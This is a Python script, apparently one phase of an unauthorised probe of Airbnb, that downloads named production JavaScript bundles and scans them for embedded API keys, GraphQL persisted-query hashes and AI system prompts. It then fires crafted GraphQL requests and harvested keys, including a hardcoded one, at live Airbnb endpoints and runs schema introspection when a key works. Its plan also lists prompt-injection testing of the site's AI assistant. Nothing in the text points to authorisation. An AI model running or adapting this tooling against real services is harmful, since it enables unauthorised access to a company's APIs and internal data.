#!/usr/bin/env python3
"""Airbnb Phase 4 — JS Bundle Deep Analysis + GraphQL Exploitation

Critical findings from Phase 3:
  - 1b14.9925955f3c.js: Chatbot, LLM, Thread (21), WebSocket (201!)
  - 1fc1.d5ec397e89.js: OpenAi (9!), Thread, WebSocket
  - /api/v3/<OpName> endpoints accept requests WITHOUT API key
  - They return "malformed input" not "invalid key" → need correct format

This phase:
  1. Download & analyze the AI-related JS bundles for exact API formats
  2. Extract persisted query hashes (sha256)
  3. Find the real API key embedded in the bundles
  4. Craft correct GraphQL requests
  5. Test AI assistant for prompt injection
"""

import re
import json
import time
import hashlib
import requests
from urllib.parse import urljoin, quote

requests.packages.urllib3.disable_warnings()

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Accept-Language": "en-US,en;q=0.9",
})
S.verify = False

DELAY = 1.5

results = {
    "api_keys_found": [],
    "persisted_hashes": [],
    "graphql_schemas": [],
    "ai_endpoints": [],
    "working_queries": [],
    "critical_findings": [],
}

def p(msg): print(f"[*] {msg}")
def ok(msg): print(f"[+] {msg}")
def warn(msg): print(f"[!] {msg}")
def crit(msg): print(f"[!!!] {msg}")

def fetch(url, method="GET", **kw):
    time.sleep(DELAY)
    try:
        r = getattr(S, method.lower())(url, timeout=20, **kw)
        return r
    except Exception as e:
        warn(f"  Failed: {type(e).__name__}")
        return None

# ─── 1. Deep JS Bundle Analysis ─────────────────────────────────

p("=" * 60)
p("PHASE 4A: Deep JS Bundle Analysis — AI & Key Extraction")
p("=" * 60)

# These are the critical bundles from Phase 3
CRITICAL_BUNDLES = [
    "https://a0.muscache.com/airbnb/static/packages/web/common/1b14.9925955f3c.js",  # Chatbot, LLM, Thread, WS
    "https://a0.muscache.com/airbnb/static/packages/web/common/1fc1.d5ec397e89.js",  # OpenAi!, Thread, WS
    "https://a0.muscache.com/airbnb/static/packages/web/common/0715.2d1ca11b6f.js",  # LLM, WS
    "https://a0.muscache.com/airbnb/static/packages/web/common/559b.f730c75183.js",  # LLM (12)
    "https://a0.muscache.com/airbnb/static/packages/web/common/23db.7bfaf283a0.js",  # LLM, WS
    "https://a0.muscache.com/airbnb/static/packages/web/common/43b5.68586be7b5.js",  # ContactUs
]

for bundle_url in CRITICAL_BUNDLES:
    bundle_name = bundle_url.split("/")[-1]
    p(f"\n{'='*40}")
    p(f"Analyzing: {bundle_name}")
    p(f"{'='*40}")
    
    r = fetch(bundle_url)
    if not r or r.status_code != 200:
        warn(f"  Could not fetch {bundle_name}")
        continue
    
    body = r.text
    ok(f"  Size: {len(body)} bytes")
    
    # ── Extract API keys ──
    key_patterns = [
        (r'"([a-f0-9]{32})"', "32-hex key"),
        (r"'([a-f0-9]{32})'", "32-hex key (single quote)"),
        (r'(?:api_key|apiKey|API_KEY|airbnbApiKey|AIRBNB_API_KEY)\s*[:=]\s*["\']([^"\']{10,80})["\']', "Named API key"),
        (r'X-Airbnb-API-Key["\']?\s*[:=,]\s*["\']([^"\']+)["\']', "X-Airbnb-API-Key value"),
        (r'persistedQuery.*?sha256Hash["\']?\s*[:=]\s*["\']([a-f0-9]{64})["\']', "Persisted query hash"),
    ]
    
    for pattern, label in key_patterns:
        for m in re.finditer(pattern, body):
            val = m.group(1)
            # Filter out common false positives
            if label == "32-hex key" and val in ("00000000000000000000000000000000", "ffffffffffffffffffffffffffffffff"):
                continue
            ok(f"  [{label}] {val[:64]}")
            if "key" in label.lower():
                results["api_keys_found"].append({"key": val, "source": bundle_name, "type": label})
            elif "hash" in label.lower():
                results["persisted_hashes"].append({"hash": val, "source": bundle_name})
    
    # ── Extract sha256 hashes (persisted queries) ──
    sha_hashes = set()
    for m in re.finditer(r'sha256Hash["\']?\s*[:=]\s*["\']([a-f0-9]{64})["\']', body):
        sha_hashes.add(m.group(1))
    for m in re.finditer(r'"([a-f0-9]{64})"', body):
        h = m.group(1)
        # Check if near a persisted query context
        start = max(0, m.start() - 100)
        context = body[start:m.start()]
        if any(kw in context.lower() for kw in ["persist", "hash", "sha256", "query", "operation"]):
            sha_hashes.add(h)
    
    if sha_hashes:
        ok(f"  Persisted query hashes: {len(sha_hashes)}")
        for h in sorted(sha_hashes)[:10]:
            p(f"    {h}")
            results["persisted_hashes"].append({"hash": h, "source": bundle_name})
    
    # ── Extract operation names with context ──
    ops = set()
    for m in re.finditer(r'operationName["\']?\s*[:=]\s*["\'](\w{3,50})["\']', body):
        ops.add(m.group(1))
    for m in re.finditer(r'(?:query|mutation)\s+(\w{3,50})\s*[\({]', body):
        ops.add(m.group(1))
    
    if ops:
        ok(f"  GraphQL operations: {len(ops)}")
        for op in sorted(ops):
            p(f"    {op}")
            results["graphql_schemas"].append({"operation": op, "source": bundle_name})
    
    # ── Extract AI/LLM specific patterns ──
    ai_patterns = {
        "system_prompt": r'(?:system_?[Pp]rompt|systemMessage|system_message|SYSTEM_PROMPT)["\']?\s*[:=]\s*["\']([^"\']{5,})["\']',
        "openai_ref": r'(?:openai|open_ai|OpenAI|OPENAI)\w*["\']?\s*[:=]\s*["\']([^"\']{3,})["\']',
        "model_name": r'(?:model|MODEL)["\']?\s*[:=]\s*["\'](gpt-[^"\']+|claude[^"\']*|o1[^"\']*)["\']',
        "prompt_template": r'(?:prompt|instruction|directive)["\']?\s*[:=]\s*["\u0060]([^"\'`]{20,200})["\u0060\']',
        "ai_endpoint": r'(?:ai|assistant|chat|llm|bot)[_/\-]?(?:api|endpoint|url|service)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        "websocket_url": r'wss?://[^"\'>\s]+',
        "chat_api": r'/(?:api|v\d+)/(?:chat|conversation|message|thread|assistant)[^"\'>\s]*',
    }
    
    for name, pattern in ai_patterns.items():
        matches = re.findall(pattern, body, re.I)
        if matches:
            warn(f"  [{name}] {len(matches)} match(es):")
            for match in matches[:5]:
                warn(f"    → {match[:150]}")
                if name == "system_prompt":
                    crit(f"    SYSTEM PROMPT FOUND!")
                    results["critical_findings"].append({
                        "type": "system_prompt",
                        "value": match[:500],
                        "source": bundle_name,
                    })
                elif name == "ai_endpoint":
                    results["ai_endpoints"].append({"endpoint": match, "source": bundle_name})
    
    # ── Extract variable/field names related to AI ──
    ai_fields = set()
    for m in re.finditer(r'["\']((?:ai|chat|assistant|bot|conversation|thread|message|prompt)[A-Za-z_]{2,40})["\']', body, re.I):
        ai_fields.add(m.group(1))
    
    if ai_fields:
        ok(f"  AI-related fields: {len(ai_fields)}")
        for field in sorted(ai_fields)[:20]:
            p(f"    {field}")

# ─── 2. Test GraphQL with persisted query hashes ────────────────

p("")
p("=" * 60)
p("PHASE 4B: GraphQL Persisted Query Hash Exploitation")
p("=" * 60)

# Deduplicate hashes
unique_hashes = list(set(h["hash"] for h in results["persisted_hashes"]))
ok(f"Total unique hashes to test: {len(unique_hashes)}")

# The key insight: /api/v3/<OperationName> returns "malformed input" without a key
# This means the endpoint routes exist but need specific extensions.persistedQuery format

BASE = "https://www.airbnb.com/api/v3"

# First test: does the API accept persisted queries at all?
for hash_val in unique_hashes[:15]:
    p(f"\nTesting hash: {hash_val[:16]}...")
    
    # Format 1: via query params (GET)
    params = {
        "operationName": "Unknown",
        "variables": "{}",
        "extensions": json.dumps({
            "persistedQuery": {
                "version": 1,
                "sha256Hash": hash_val,
            }
        }),
    }
    
    r = fetch(f"{BASE}/graphql", params=params)
    if r:
        ok(f"  GET graphql: {r.status_code}")
        body = r.text
        if "PersistedQueryNotFound" in body:
            ok(f"    Hash not found (but persisted queries ARE supported!)")
            results["working_queries"].append({"type": "persisted_queries_confirmed", "status": "not_found"})
        elif "data" in body and '"data":null' not in body:
            crit(f"    DATA RETURNED! {body[:300]}")
            results["critical_findings"].append({
                "type": "persisted_query_data",
                "hash": hash_val,
                "response": body[:500],
            })
        else:
            p(f"    {body[:150]}")
    
    # Format 2: via POST body
    r = fetch(f"{BASE}/graphql", method="POST",
              headers={"Content-Type": "application/json"},
              data=json.dumps({
                  "operationName": "Unknown",
                  "variables": {},
                  "extensions": {
                      "persistedQuery": {
                          "version": 1,
                          "sha256Hash": hash_val,
                      }
                  }
              }))
    if r:
        ok(f"  POST graphql: {r.status_code}")
        body = r.text
        if "PersistedQueryNotFound" in body:
            ok(f"    Persisted query framework confirmed")
        elif "data" in body and '"data":null' not in body and "invalid_key" not in body:
            crit(f"    DATA RETURNED on POST! {body[:300]}")

# ─── 3. Try known Airbnb operation hashes ───────────────────────

p("")
p("=" * 60)
p("PHASE 4C: Known Airbnb Operation Hash Testing")
p("=" * 60)

# Try to get the operation working with proper format
# The /api/v3/StaysSearch endpoint is public — let's figure out its format

p("Testing StaysSearch (known public endpoint)...")
r = fetch(f"{BASE}/StaysSearch", method="POST",
          headers={"Content-Type": "application/json"},
          data=json.dumps({
              "operationName": "StaysSearch",
              "variables": {
                  "staysSearchRequest": {
                      "metadataOnly": True,
                      "rawParams": [
                          {"filterName": "query", "filterValues": ["New York"]},
                      ],
                  }
              },
              "extensions": {
                  "persistedQuery": {
                      "version": 1,
                      "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000",
                  }
              }
          }))
if r:
    ok(f"  StaysSearch POST: {r.status_code} — {len(r.text)} bytes")
    p(f"  {r.text[:500]}")

# Try without extensions
r = fetch(f"{BASE}/StaysSearch", method="POST",
          headers={"Content-Type": "application/json"},
          data=json.dumps({
              "operationName": "StaysSearch",
              "variables": {
                  "staysSearchRequest": {
                      "metadataOnly": True,
                      "rawParams": [
                          {"filterName": "query", "filterValues": ["New York"]},
                      ],
                  }
              },
          }))
if r:
    ok(f"  StaysSearch without extensions: {r.status_code}")
    p(f"  {r.text[:500]}")

# Try with observed API key
OLD_KEY = "d306zoyjsyarp7ifhu67rjxn52tv0t20"
r = fetch(f"{BASE}/StaysSearch", method="POST",
          headers={
              "Content-Type": "application/json",
              "X-Airbnb-API-Key": OLD_KEY,
          },
          data=json.dumps({
              "operationName": "StaysSearch",
              "variables": {
                  "staysSearchRequest": {
                      "metadataOnly": True, 
                      "rawParams": [
                          {"filterName": "query", "filterValues": ["New York"]},
                      ],
                  }
              },
              "extensions": {
                  "persistedQuery": {
                      "version": 1,
                      "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000",
                  }
              }
          }))
if r:
    ok(f"  StaysSearch with API key: {r.status_code}")
    p(f"  {r.text[:500]}")

# ─── 4. Extract actual network requests from page load ──────────

p("")
p("=" * 60)
p("PHASE 4D: Dynamic Request Interception (Observed API Calls)")
p("=" * 60)

# Fetch the search page and look for actual API calls made during page load
# These will have the correct format
r = fetch("https://www.airbnb.com/s/New-York/homes")
if r and r.status_code == 200:
    body = r.text
    
    # Look for the bootstrap data / initial state that contains API key
    for m in re.finditer(r'(?:bootstrap|initial|preload)(?:[Dd]ata|[Ss]tate|[Cc]onfig)\s*=\s*(\{.*?\})\s*;', body):
        try:
            data = json.loads(m.group(1))
            ok(f"  Found bootstrap data with keys: {list(data.keys())[:10]}")
        except:
            pass
    
    # Look for __NEXT_DATA__ or similar
    for m in re.finditer(r'<script[^>]*id="data-deferred-state-0"[^>]*>(.*?)</script>', body, re.DOTALL):
        ok(f"  Found deferred state data ({len(m.group(1))} chars)")
        try:
            data = json.loads(m.group(1))
            # Mine for API key in nested structure
            def find_keys(obj, path=""):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if any(kw in k.lower() for kw in ["api_key", "apikey", "key"]) and isinstance(v, str) and len(v) > 15:
                            ok(f"    Found key at {path}.{k}: {v[:40]}")
                            results["api_keys_found"].append({"key": v, "path": f"{path}.{k}", "source": "deferred-state"})
                        find_keys(v, f"{path}.{k}")
                elif isinstance(obj, list):
                    for i, item in enumerate(obj[:5]):
                        find_keys(item, f"{path}[{i}]")
            find_keys(data)
        except:
            pass
    
    # Look for any embedded API configuration
    for m in re.finditer(r'<script[^>]*>(.*?)</script>', body, re.DOTALL):
        script = m.group(1)
        if len(script) > 100 and len(script) < 50000:
            # Check for API key pattern
            for km in re.finditer(r'["\']([a-f0-9]{32})["\']', script):
                key_candidate = km.group(1)
                # Check surrounding context
                start = max(0, km.start() - 50)
                ctx = script[start:km.start() + 35]
                if any(kw in ctx.lower() for kw in ["key", "api", "config", "client"]):
                    ok(f"    Key candidate in script: {key_candidate} (context: ...{ctx[-40:]})")
                    results["api_keys_found"].append({"key": key_candidate, "source": "inline_script", "context": ctx[-60:]})

# ─── 5. Fetch a real API request format by loading a page ───────

p("")
p("=" * 60)
p("PHASE 4E: Reverse-Engineering API Request Format")
p("=" * 60)

# Try the help center with specific entry point
help_urls = [
    "https://www.airbnb.com/help/article/1/how-does-airbnb-work",
    "https://www.airbnb.com/help/search?query=cancel",
]

for url in help_urls:
    p(f"Fetching {url}...")
    r = fetch(url)
    if r and r.status_code == 200:
        # Look for API calls embedded in page data
        for m in re.finditer(r'<script[^>]*id="data-deferred-state-\d+"[^>]*>(.*?)</script>', r.text, re.DOTALL):
            try:
                chunk = m.group(1)
                if len(chunk) > 100:
                    d = json.loads(chunk)
                    # Look for operation names and their formats
                    def extract_gql(obj, depth=0):
                        if depth > 8:
                            return
                        if isinstance(obj, dict):
                            # Check for operation references
                            if "operationName" in obj:
                                ok(f"    GQL operation: {obj['operationName']}")
                            if "queryName" in obj:
                                ok(f"    Query name: {obj['queryName']}")
                            if "query" in obj and isinstance(obj["query"], str) and "query" in obj["query"]:
                                ok(f"    GQL query: {obj['query'][:100]}")
                            for k, v in obj.items():
                                extract_gql(v, depth + 1)
                        elif isinstance(obj, list):
                            for item in obj[:10]:
                                extract_gql(item, depth + 1)
                    extract_gql(d)
            except:
                pass

# ─── 6. Decode deferred state for API key ───────────────────────

p("")
p("=" * 60)
p("PHASE 4F: Mining Deferred State for API Key & Config")
p("=" * 60)

r = fetch("https://www.airbnb.com/")
if r and r.status_code == 200:
    body = r.text
    
    # Find ALL script tags with data
    scripts_with_data = []
    for m in re.finditer(r'<script[^>]*>(.*?)</script>', body, re.DOTALL):
        content = m.group(1).strip()
        if len(content) > 200 and ("{" in content or "=" in content):
            scripts_with_data.append(content)
    
    ok(f"  Found {len(scripts_with_data)} data-bearing script tags")
    
    for i, script in enumerate(scripts_with_data):
        # Try to parse as JSON
        if script.startswith("{") or script.startswith("["):
            try:
                data = json.loads(script)
                ok(f"  Script #{i}: JSON with keys: {list(data.keys())[:8] if isinstance(data, dict) else f'list[{len(data)}]'}")
            except:
                pass
        
        # Look for API key assignments
        for m in re.finditer(r'(?:window\.__)?(?:AIRBNB_)?(?:API_KEY|api[_]?key|apiKey|clientKey|CLIENT_KEY)["\']?\s*[:=]\s*["\']([^"\']{10,80})["\']', script, re.I):
            key = m.group(1)
            crit(f"  FOUND API KEY: {key}")
            results["api_keys_found"].append({"key": key, "source": "window_config", "type": "direct"})
        
        # Look for GraphQL configuration
        for m in re.finditer(r'graphql[_]?(?:url|endpoint|uri)["\']?\s*[:=]\s*["\']([^"\']+)["\']', script, re.I):
            ok(f"  GraphQL URL: {m.group(1)}")
        
        # Look for feature flags related to AI
        for m in re.finditer(r'["\']([^"\']*(?:ai|assistant|chatbot|llm)[^"\']*)["\']', script, re.I):
            if len(m.group(1)) > 3 and len(m.group(1)) < 100:
                p(f"  AI flag: {m.group(1)}")

# ─── 7. Brute-force API key from observed patterns ──────────────

p("")
p("=" * 60)
p("PHASE 4G: API Key Validation — Testing All Candidates")
p("=" * 60)

# Deduplicate keys
unique_keys = list(set(k["key"] for k in results["api_keys_found"] if len(k["key"]) >= 20))
ok(f"Unique key candidates: {len(unique_keys)}")

for key in unique_keys[:10]:
    p(f"\nTesting key: {key[:32]}...")
    
    # Test with GraphQL __typename
    r = fetch("https://www.airbnb.com/api/v3/graphql", method="POST",
              headers={
                  "Content-Type": "application/json",
                  "X-Airbnb-API-Key": key,
              },
              data=json.dumps({"query": "{ __typename }"}))
    if r:
        if "invalid_key" in r.text.lower():
            p(f"  Invalid key")
        elif r.status_code == 200:
            body = r.text
            if "data" in body:
                crit(f"  KEY WORKS! {key}")
                crit(f"  Response: {body[:300]}")
                results["critical_findings"].append({
                    "type": "valid_api_key",
                    "key": key,
                    "response": body[:300],
                })
                
                # Immediately try introspection
                r2 = fetch("https://www.airbnb.com/api/v3/graphql", method="POST",
                          headers={
                              "Content-Type": "application/json",
                              "X-Airbnb-API-Key": key,
                          },
                          data=json.dumps({
                              "query": "{ __schema { queryType { name } types { name kind } } }"
                          }))
                if r2:
                    crit(f"  Introspection: {r2.text[:500]}")
            else:
                ok(f"  Different error: {body[:200]}")

# ─── SUMMARY ────────────────────────────────────────────────────

p("")
p("=" * 60)
p("PHASE 4 SUMMARY")
p("=" * 60)

ok(f"API Keys found:        {len(results['api_keys_found'])}")
ok(f"Persisted hashes:      {len(results['persisted_hashes'])}")
ok(f"GQL operations:        {len(results['graphql_schemas'])}")
ok(f"AI endpoints:          {len(results['ai_endpoints'])}")
ok(f"Working queries:       {len(results['working_queries'])}")
ok(f"CRITICAL findings:     {len(results['critical_findings'])}")

if results["api_keys_found"]:
    ok("API keys:")
    for k in results["api_keys_found"][:10]:
        p(f"  {k['key'][:32]}... from {k['source']}")

if results["graphql_schemas"]:
    ok("GraphQL operations:")
    for s in results["graphql_schemas"][:20]:
        p(f"  {s['operation']} (from {s['source']})")

for f in results["critical_findings"]:
    crit(f"  [{f.get('type','')}] {str(f)[:200]}")

with open("/tmp/airbnb_phase4_results.json", "w") as f:
    json.dump(results, f, indent=2, default=str)

ok("Results saved to /tmp/airbnb_phase4_results.json")
ok("Phase 4 complete")
